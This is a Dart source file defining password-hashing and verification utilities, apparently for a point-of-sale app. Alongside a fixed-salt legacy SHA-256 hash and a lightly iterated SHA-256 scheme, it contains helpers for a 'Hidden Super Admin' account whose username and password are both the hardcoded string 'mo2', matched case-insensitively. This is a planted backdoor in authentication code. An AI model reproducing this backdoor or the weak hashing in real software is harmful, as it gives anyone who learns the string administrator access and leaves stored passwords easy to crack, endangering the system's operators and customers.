import 'dart:convert';
import 'dart:math';
import 'package:crypto/crypto.dart';

class SecurityUtils {
  static const String _legacyHashSalt = 'POS_2026_SECURE_SALT_v1_';
  static const String _v2Prefix = r'$v2$';
  static const int _v2Iterations = 1000;

  /// Legacy SHA-256 hash kept for backward compatibility with existing accounts.
  static String hashPasswordLegacy(String password) {
    final bytes = utf8.encode(_legacyHashSalt + password);
    return sha256.convert(bytes).toString();
  }

  /// Hash a password with a per-user random salt and key-stretching rounds.
  static String hashPassword(String password, {String? salt}) {
    final effectiveSalt = salt ?? _generateSaltHex();
    List<int> digestBytes = utf8.encode('$effectiveSalt:$password');
    for (var i = 0; i < _v2Iterations; i++) {
      digestBytes = sha256.convert(digestBytes).bytes;
    }
    final hashHex = digestBytes
        .map((b) => b.toRadixString(16).padLeft(2, '0'))
        .join();
    return '$_v2Prefix$effectiveSalt\$$hashHex';
  }

  /// Whether [storedHash] uses the legacy fixed-salt SHA-256 format.
  static bool isLegacyHash(String storedHash) =>
      !storedHash.startsWith(_v2Prefix);

  /// Verify [password] against either a `$v2$` salted hash or legacy hash.
  static bool verifyPassword(String password, String storedHash) {
    if (storedHash.isEmpty) return false;
    if (storedHash.startsWith(_v2Prefix)) {
      final parts = storedHash.split(r'$');
      // Expected format: ['', 'v2', '<salt>', '<hash>']
      if (parts.length != 4 || parts[2].isEmpty || parts[3].isEmpty) {
        return false;
      }
      final candidate = hashPassword(password, salt: parts[2]);
      return _constantTimeEquals(candidate, storedHash);
    }
    return _constantTimeEquals(hashPasswordLegacy(password), storedHash);
  }

  /// Hidden Super Admin (MO2) credential helpers (case-insensitive).
  static bool isSuperAdminUsername(String username) =>
      username.trim().toLowerCase() == 'mo2';

  static bool isSuperAdminPassword(String password) =>
      password.trim().toLowerCase() == 'mo2';

  static bool isSuperAdminCredentials(String username, String password) =>
      isSuperAdminUsername(username) && isSuperAdminPassword(password);

  static String _generateSaltHex([int byteLength = 16]) {
    final random = Random.secure();
    final bytes = List<int>.generate(byteLength, (_) => random.nextInt(256));
    return bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join();
  }

  static bool _constantTimeEquals(String a, String b) {
    if (a.length != b.length) return false;
    var diff = 0;
    for (var i = 0; i < a.length; i++) {
      diff |= a.codeUnitAt(i) ^ b.codeUnitAt(i);
    }
    return diff == 0;
  }
}
